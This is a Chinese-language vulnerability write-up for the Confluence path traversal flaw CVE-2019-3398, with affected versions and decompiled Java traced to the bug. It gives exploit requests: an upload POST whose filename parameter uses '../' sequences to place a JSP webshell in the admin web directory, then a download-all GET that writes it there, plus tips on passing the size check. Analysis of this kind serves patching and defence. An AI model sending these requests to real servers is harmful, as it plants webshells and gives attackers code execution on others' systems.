<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-3398confluence-路径穿越漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-3398</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Confluence </span><span class="csECDA2D3">路径穿越漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">2.0.0 &lt;= version &lt; 6.6.13<br/>6.7.0 &lt;= version &lt; 6.12.4<br/>6.13.0 &lt;= version &lt; 6.13.4<br/>6.14.0 &lt;= version &lt; 6.14.3<br/>6.15.0 &lt;= version &lt; 6.15.2</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">首先根据官方描述，</span><span class="cs9FB05234">downloadallattachments</span><span class="cs9C1B1871">这个资源，结合其验证缓解措施的方式，找到了漏洞触发点：</span></p><p class="cs3A447A38"><span class="cs9FB05234">... =</span><span class="cs7FFD2630">》附件</span><span class="cs9FB05234">=</span><span class="cs7FFD2630">》下载全部</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">点击</span><span class="cs7FFD2630">下载全部</span><span class="cs9C1B1871">时，会触发一个</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /pages/downloadallattachments.action?pageId=65601</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后响应</span></p><p class="cs3A447A38"><span class="cs9FB05234">Location: /download/temp/downloadi120q121507.zip?contentType=application/zip</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">而且每次发出</span><span class="cs9FB05234">downloadallattachments.action</span><span class="cs9C1B1871">请求，其响应的</span><span class="cs8926E06">Location</span><span class="cs9C1B1871">路径的</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">文件名都不一样，发现原来是服务端每收到一次</span><span class="cs8926E06">downloadallattachments.action</span><span class="cs9C1B1871">请求，就会在</span><span class="cs9FB05234">download/temp/</span><span class="cs9C1B1871">目录下生成一个</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">文件：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">搜索了一下，发现这个文件是在</span><span class="cs8926E06">/Users/xxx/confluenceHome</span><span class="cs9C1B1871">，也就是</span><span class="cs8926E06">confluence</span><span class="cs9C1B1871">的安装目录下。</span></p><p class="cs3A447A38"><span class="cs9FB05234">cqq@ubuntu:~$ find .|grep download45lL6115220.zip</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">./confluenceHome/temp/download45lL6115220.zip</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后看到这个目录下还有一个</span><span class="cs8926E06">attachments</span><span class="cs9C1B1871">目录，为了验证这就是附件上传的目录，</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">于是，新建了一个页面，上传了几个文本文件，通过</span><span class="cs8926E06">cat</span><span class="cs9C1B1871">出来的内容与上传的内容匹配，判定这个就是上传的附件被存放的目录，但是这个目录下的文件名被重命名了。既然官方说是路径穿越漏洞，就得找到文件名或者文件路径的输入点。在这里上传文件的过程中抓一下包，发现有两个参数是文件名</span><span class="cs8926E06">/</span><span class="cs9C1B1871">文件路径相关的，</span><span class="cs9FB05234">filename</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">name</span><span class="cs9C1B1871">，经过测试发现漏洞点参数是</span><span class="cs9FB05234">filename</span><span class="cs9C1B1871">。</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">通过一番</span><span class="cs9FB05234">grep -rn xxx *</span><span class="cs9C1B1871">的查找，发现需要两步来完成对路径穿越的利用。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">POST /plugins/drag-and-drop/upload.action?pageId=65601&amp;filename=../../../../../../Users/xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cqq2.jsp&amp;size=754&amp;minorEdit=true&amp;spaceKey=ADMIN&amp;mimeType=application%2Foctet-stream&amp;atl_token=47ae1afbc53f1ed100a4c36053de2d754d48ffeb&amp;contentType=page&amp;isVFMSupported=true&amp;name=cqq2.jsp</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">先将</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">上传上去，其内容会出现在</span><span class="cs8926E06">confluence</span><span class="cs9C1B1871">的安装目录，即</span><span class="cs8926E06">/Users/xxx/confluenceHome</span><span class="cs9C1B1871">。注意上传的时候的</span><span class="cs9FB05234">size</span><span class="cs9C1B1871">参数需与</span><span class="cs9FB05234">Content-Length</span><span class="cs9C1B1871">值保持一致，服务端会对这个做校验，若发现不一致，则会导致</span><span class="cs8926E06">500</span><span class="cs9C1B1871">。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在</span><span class="cs8926E06">UploadAction#execute</span><span class="cs9C1B1871">下断点</span></p><p class="cs3A447A38"><span class="cs9FB05234">confluence/WEB-INF/atlassian-bundled-plugins/confluence-drag-and-drop-6.13.0.jar!/com/atlassian/confluence/plugins/dragdrop/UploadAction.class</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span></p><p class="cs3A447A38"><span class="cs9FB05234">InputStream inStream = this.getStreamForEncoding(this.httpServletRequest);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">this.fileUploadManager.storeResource(new InputStreamAttachmentResource(inStream, this.filename, this.mimeType, this.size, (String)null, this.minorEdit), (ContentEntityObject)content);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将</span><span class="cs8926E06">POST</span><span class="cs9C1B1871">的内容写入到缓存文件中：</span><span class="cs9FB05234">attachments/ver003//56/98/98306/101/65/65601/917509/1</span><span class="cs9C1B1871">，</span><span class="cs8926E06"><br/>3.png<br/></span><span class="cs9FB05234">filename</span><span class="cs9C1B1871">值没有对</span><span class="cs9FB05234">../</span><span class="cs9C1B1871">进行过滤。</span><span class="cs8926E06"><br/>44.png<br/></span><span class="cs9C1B1871">上传完成之后，打开</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">全部附件</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">页面，会出现我们刚刚上传上去的文件，其文件名没有对</span><span class="cs9FB05234">../</span><span class="cs9C1B1871">进行过滤。</span><span class="cs8926E06"><br/>5.png</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2</span><span class="cs9C1B1871">、</span><span class="cs9FB05234">GET /pages/downloadallattachments.action?pageId=65601</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">然后通过这个</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求，触发将缓存的</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">内容写入指定的路径操作。</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">在</span><span class="cs8926E06">DownloadAllAttachmentsOnPageAction#execute</span><span class="cs9C1B1871">下断点</span></p><p class="cs3A447A38"><span class="cs9FB05234">confluence/WEB-INF/lib/confluence-6.13.0.jar!com/atlassian/confluence/pages/actions/DownloadAllAttachmentsOnPageAction.class</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">文件内容：</span></p><p class="cs3A447A38"><span class="cs9FB05234">public String execute() throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;List&lt;Attachment&gt; latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Iterator var2 = latestAttachments.iterator();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while(var2.hasNext()) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attachment attachment = (Attachment)var2.next();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File tmpFile = new File(this.getTempDirectoryForZipping(), attachment.getFileName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream inputStream = this.attachmentManager.getAttachmentData(attachment);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Throwable var6 = null;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream fileOutputStream = new FileOutputStream(tmpFile); &nbsp;// tmpFile</span><span class="cs7FFD2630">内容为</span><span class="cs9FB05234">/Users/Xxx/repos/confluenceRepos/temp/download8gHGV130701/../../../../../../Users/Xxx/repos/atlassian-confluence-6.13.0/confluence/admin/cmd222.jsp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Throwable var8 = null;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByteStreams.copy(inputStream, fileOutputStream); &nbsp;//</span><span class="cs7FFD2630">将缓存文件写入指定的路径</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable var31) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var8 = var31;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw var31;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} finally {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (fileOutputStream != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (var8 != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fileOutputStream.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable var30) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var8.addSuppressed(var30);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fileOutputStream.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable var33) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var6 = var33;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw var33;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} finally {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (inputStream != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (var6 != null) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inputStream.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (Throwable var29) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var6.addSuppressed(var29);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inputStream.close();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">在</span><span class="cs9FB05234">confluence</span><span class="cs7FFD2630">安装路径的</span><span class="cs9FB05234">temp</span><span class="cs7FFD2630">目录下生成</span><span class="cs9FB05234">zip</span><span class="cs7FFD2630">文件。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;File zipFile = new File(this.getConfluenceTempDirectoryPath() + File.separator + this.getZipFilename() + &quot;.zip&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileUtils.createZipFile(this.getTempDirectoryForZipping(), zipFile);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileUtils.deleteDir(this.getTempDirectoryForZipping());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.downloadPath = this.prepareDownloadPath(zipFile.getPath()) + &quot;?contentType=application/zip&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.gateKeeper.addKey(this.prepareDownloadPath(zipFile.getPath()), this.getAuthenticatedUser());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &quot;success&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先拿到</span><span class="cs8926E06">Attachement</span><span class="cs9C1B1871">列表</span></p><p class="cs3A447A38"><span class="cs9FB05234">List&lt;Attachment&gt; latestAttachments = this.attachmentManager.getLatestVersionsOfAttachments(this.getPage());</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后对列表中每个附件进行遍历，从最前面的开始，</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后通过</span><span class="cs8926E06"><br/>666.png</span></p><p class="cs3A447A38"><span class="cs9FB05234">attachment.getFileName())</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">获得附件的名字（这里有我们之前设置好的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">文件名）</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">然后执行</span></p><p class="cs3A447A38"><span class="cs9FB05234">ByteStreams.copy(inputStream, fileOutputStream);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将之前缓存的上传文件</span><span class="cs8926E06">copy</span><span class="cs9C1B1871">到通过请求参数</span><span class="cs9FB05234">filename</span><span class="cs9C1B1871">指定的路径下，实现路径穿越。</span><span class="cs8926E06"><br/>7.png<br/></span><span class="cs9C1B1871">执行前后对比如下：</span><span class="cs8926E06"><br/>8.png<br/></span><span class="cs9C1B1871">对比缓存文件和在指定路径生成的文件的</span><span class="cs8926E06">sha1</span><span class="cs9C1B1871">值对比：一致。</span><span class="cs8926E06"><br/>9.png<br/>Confluence</span><span class="cs9C1B1871">本身就可以上传任意文件内容到服务端，但是会放在缓存目录下，文件路径不可控。关键地是，没有对</span><span class="cs9FB05234">filename</span><span class="cs9C1B1871">请求参数进行过滤，有路径穿越漏洞，才能将指定文件名指定文件内容写入到文件系统中。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/4854</span></p></body>
</html>
